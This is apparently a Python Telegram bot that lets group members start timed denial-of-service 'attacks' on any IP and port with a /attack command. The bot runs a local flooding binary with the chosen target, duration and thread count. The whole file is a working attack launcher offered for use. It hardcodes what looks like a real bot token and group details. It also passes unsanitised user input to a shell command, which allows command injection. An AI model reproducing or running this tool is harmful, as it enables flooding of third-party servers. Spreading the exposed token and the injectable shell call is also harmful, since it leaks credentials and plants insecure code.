#!/usr/bin/python3
import telebot
import time
import subprocess
import random
import os
import threading
from datetime import datetime
import pytz  # Required for timezone handling

# Your Telegram bot token
bot = telebot.TeleBot('7330439352:AAGWmViOQAgUfGCm_Nqyw2OupWLh8h94Vgk')

# Group details (Restored original format)
GROUP_ID = "-1002399798592"
GROUP_INVITE_LINK = "https://t.me/+ZPo210hJV2YwZDhl"

# Attack settings
MAX_ATTACK_TIME = 180
RAHUL_PATH = "./Rahul"

# 🎯 Random Image URLs  
image_urls = [
    "https://envs.sh/Err.0.jpg",
    "https://envs.sh/Er9.jpg",
    "https://envs.sh/ErN.jpg",
    "https://envs.sh/Er6.webp",
    "https://envs.sh/Erm.webp",
    "https://envs.sh/Erf.jpg",
    "https://envs.sh/Erf.jpg",
    "https://envs.sh/ErN.jpg",
    "https://envs.sh/Er9.jpg",
    "https://envs.sh/Err.0.jpg"
]

# Cooldown tracking
attack_active = False
current_attacker = None
attack_end_time = 0

# Function to get current Kolkata time in HH:MM:SS format
def get_kolkata_time():
    kolkata_tz = pytz.timezone('Asia/Kolkata')
    kolkata_time = datetime.now(kolkata_tz)
    return kolkata_time.strftime('%H:%M:%S')

# Function to check if a user is in the group
def is_user_in_group(user_id):
    try:
        member = bot.get_chat_member(GROUP_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception:
        return False

# Function to check if the command is sent in the group only
def is_message_from_group(message):
    return str(message.chat.id) == GROUP_ID

# Function to restrict bot usage to group members & only inside the group
def restricted_access(func):
    def wrapper(message):
        user_id = str(message.from_user.id)

        if not is_user_in_group(user_id):
            bot.reply_to(message, f"🚨 **Join our group first!**\n🔗 [Click Here to Join]({GROUP_INVITE_LINK})", parse_mode="Markdown")
            return
        
        if not is_message_from_group(message):
            bot.reply_to(message, "❌ **You can use this command only in the group!**")
            return
        
        return func(message)
    return wrapper

@bot.message_handler(commands=['attack'])
@restricted_access
def handle_attack(message):
    global attack_active, current_attacker, attack_end_time

    user_id = message.from_user.id
    username = message.from_user.first_name

    # If an attack is already in progress
    if attack_active:
        remaining_time = max(0, int(attack_end_time - time.time()))
        bot.reply_to(message, f"⚠️ **Attack in progress!**\n👤 **Attacker:** {current_attacker}\n⏳ **Time Left:** {remaining_time}s")
        return

    command = message.text.split()
    
    if len(command) != 4:
        bot.reply_to(message, "Usage: /attack <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
        if time_duration > MAX_ATTACK_TIME:
            bot.reply_to(message, f"❌ Maximum attack time is {MAX_ATTACK_TIME} seconds.")
            return
    except ValueError:
        bot.reply_to(message, "Error: PORT and TIME must be integers.")
        return

    # Ensure Rahul is executable
    if not os.path.exists(RAHUL_PATH):
        bot.reply_to(message, "❌ Error: Rahul executable not found.")
        return
    
    if not os.access(RAHUL_PATH, os.X_OK):
        os.chmod(RAHUL_PATH, 0o755)

    # Mark attack as active
    attack_active = True
    current_attacker = username
    attack_end_time = time.time() + time_duration

    # Start Attack Notification
    random_image = random.choice(image_urls)
    attack_message = bot.send_photo(message.chat.id, random_image,
                                    caption=f"🚀 **Attack started!**\n🎯 Target: `{target}:{port}`\n⏳ **Time:** {time_duration}s\n🕒 **Kolkata Time:** `{get_kolkata_time()}`\n👤 **Attacker:** {username}",
                                    parse_mode="Markdown")

    # Function to update countdown dynamically
    def update_timer():
        while time.time() < attack_end_time:
            remaining_time = max(0, int(attack_end_time - time.time()))  # Prevent negative values
            try:
                bot.edit_message_caption(
                    chat_id=attack_message.chat.id,
                    message_id=attack_message.message_id,
                    caption=f"🚀 **Attack started!**\n🎯 Target: `{target}:{port}`\n⏳ **Time Left:** `{remaining_time}s`\n🕒 **Kolkata Time:** `{get_kolkata_time()}`\n👤 **Attacker:** {username}",
                    parse_mode="Markdown"
                )
            except Exception:
                pass
            time.sleep(1)  # Update every second

        # Final update after countdown reaches 0
        bot.edit_message_caption(
            chat_id=attack_message.chat.id,
            message_id=attack_message.message_id,
            caption=f"✅ **Attack finished!**\n🎯 Target: `{target}:{port}`\n👤 **Attacker:** {username}",
            parse_mode="Markdown"
        )

        global attack_active, current_attacker
        attack_active = False
        current_attacker = None

    # Start countdown thread
    threading.Thread(target=update_timer, daemon=True).start()

    # Execute Attack
    try:
        full_command = f"{RAHUL_PATH} {target} {port} {time_duration} 900"
        subprocess.run(full_command, shell=True, capture_output=True, text=True)
    except Exception as e:
        bot.reply_to(message, f"❌ Unexpected error: {str(e)}")
        attack_active = False  # Release cooldown on error

@bot.message_handler(commands=['start'])
@restricted_access
def welcome_start(message):
    bot.reply_to(message, f"🚀 **Welcome!**\nJoin our group first to use this bot:\n🔗 [Join Here]({GROUP_INVITE_LINK})", parse_mode="Markdown")

# Start polling
bot.polling(none_stop=True)
        
        
     




